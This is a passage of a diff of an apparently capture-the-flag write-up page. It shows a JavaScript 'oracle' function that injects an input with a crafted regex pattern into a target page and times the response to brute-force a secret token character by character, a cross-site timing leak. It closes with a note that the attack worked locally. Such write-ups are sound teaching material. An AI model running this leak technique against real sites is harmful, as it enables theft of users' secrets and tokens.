-</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#75715e">// Do nothing, just wait for the next interval
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            }
-</span></span><span style="display:flex;"><span>        }, <span style="color:#ae81ff">100</span>);
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>() <span style="color:#f92672">-</span> <span style="color:#a6e22e">start</span>;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">sleep</span><span class="p">(</span><span class="nx">time</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">time</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">popup</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="s2">&#34;palle&#34;</span><span class="p">,</span> <span class="s2">&#34;width=200,height=100&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">oracle</span><span class="p">(</span><span class="nx">tobrute</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">final_pattern</span> <span class="o">=</span> <span class="s2">&#34;^&#34;</span> <span class="o">+</span> <span class="nx">tobrute</span> <span class="o">+</span> <span class="s2">&#34;(([a-f0-9]+.)[a-f0-9])+$&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;PATTERN&#34;</span><span class="p">,</span> <span class="nx">final_pattern</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">count</span> <span class="o">=</span> <span class="mi">30</span> <span class="o">+</span> <span class="nx">tobrute</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">tokstr</span> <span class="o">=</span> <span class="s2">&#34;{{TOKEN}}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">html</span> <span class="o">=</span> <span class="sb">`&lt;input value=&#34;{{TOKEN}}</span><span class="si">${</span><span class="s1">&#39;a&#39;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">count</span><span class="p">)</span><span class="si">}</span><span class="sb">!&#34; pattern=&#34;</span><span class="si">${</span><span class="nx">final_pattern</span><span class="si">}</span><span class="sb">&#34; /&gt;`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">html</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">popup</span><span class="p">(</span><span class="s2">&#34;http://web:3000/?html=&#34;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">html</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">w</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">&#34;about:blank&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">interval</span> <span class="o">=</span> <span class="nx">setInterval</span><span class="p">(</span><span class="kr">async</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">w</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">clearInterval</span><span class="p">(</span><span class="nx">interval</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">resolve</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// Do nothing, just wait for the next interval
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>We tried to execute this locally and&hellip; it worked!</p>
 <p><img src="/images/image-fireleak1.png" alt="alt text"></p>
 <p>So it should also work on the remote server, right?
